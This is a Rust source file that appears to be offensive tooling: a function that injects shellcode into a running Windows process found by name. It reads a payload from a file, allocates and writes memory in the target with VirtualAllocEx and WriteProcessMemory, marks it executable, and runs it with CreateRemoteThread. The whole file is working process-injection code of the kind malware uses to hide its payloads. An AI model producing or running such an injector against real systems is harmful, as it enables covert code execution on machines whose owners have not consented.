
use std::mem::transmute;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{GetLastError,CloseHandle, FALSE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Memory::*;

pub fn shellcode_injector(process_name: &str, shellcode_path: &str){

        let shellcode = std::fs::read(shellcode_path).expect("[-] Read failed");
        let shellcode_size = shellcode.len();
        let mut system = System::new();
    
        system.refresh_processes();
        let pid = system
            .processes_by_name(process_name)
            .next()
            .expect("[-]no process!")
            .pid()
            .as_u32();
    
        unsafe {
    
            let process_handle = OpenProcess(
                PROCESS_ALL_ACCESS,
                FALSE , 
                pid);
            if process_handle == 0 {
                panic!("[-]OpenProcess failed: {}!", GetLastError());
            }
            let remote_buffer  = VirtualAllocEx(
                process_handle,
                null(), 
                shellcode_size, 
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE );
            if remote_buffer.is_null() {
                panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
            }
            let res = WriteProcessMemory(
                process_handle,
                remote_buffer, 
                shellcode.as_ptr().cast(),
                shellcode_size,
                null_mut());
            if res == 0 {
                panic!("[-] Write Process Memory failed: {}!", GetLastError());
            }
            
            let mut old = PAGE_READWRITE;
            let res = VirtualProtectEx(
                process_handle, 
                remote_buffer,
                shellcode_size, 
                PAGE_EXECUTE, 
                &mut old);
            if res == FALSE {
                    panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
            }
    
    
            let func = transmute(remote_buffer);
    
            let res = CreateRemoteThread(
                process_handle,
                null(), 
                0,
                func, 
                null(), 
                0 ,
                null_mut()); 
    
            let _res: i32 = CloseHandle(process_handle);
                if res == 0 {
                    panic!("[-]CloseHandle failed: {}!", GetLastError());
                }
        }
    }

